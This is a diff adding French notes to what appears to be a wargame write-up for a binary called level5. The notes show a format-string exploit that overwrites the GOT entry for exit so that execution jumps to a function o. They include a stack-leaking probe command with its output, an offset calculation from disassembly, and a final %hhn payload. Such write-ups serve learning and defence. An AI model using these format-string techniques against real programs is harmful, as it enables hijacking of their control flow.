@@ -72,7 +72,17 @@ OFFSET   TYPE              VALUE
 0804983c R_386_JUMP_SLOT   __libc_start_main
 
 
-On va ecraser l'offset de exit par une autre addresse, dans ce level on appeler la function o.
+On va ecraser l'offset n exit par une autre addresse, dans ce level on appeler la function o. 0x080484a4
+
+
+(python -c 'print "%08x."*50') | ./level5
+00000200.b7fd1ac0.b7ff37d0.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252..........
+
+On retrouve notre chaine de caractere "x80%"(litle-endian) au 4e offset. On peut aussi a le retrouver en faisant un calcul:
+   	0x080484c5 <+3>:	sub    esp,0x218	   
+	0x080484dc <+26>:	lea    eax,[ebp-0x208]
+	0x218 - 0x208 = 0x10 = 16 = 4 * 4 
 
 
 
+r < <(python -c 'print "\x39\x98\x04\x08"+ "\x38\x98\x04\x08" + "A"*124 + "%4$hhn" + "A"*0x20 + "%5$hhn"')
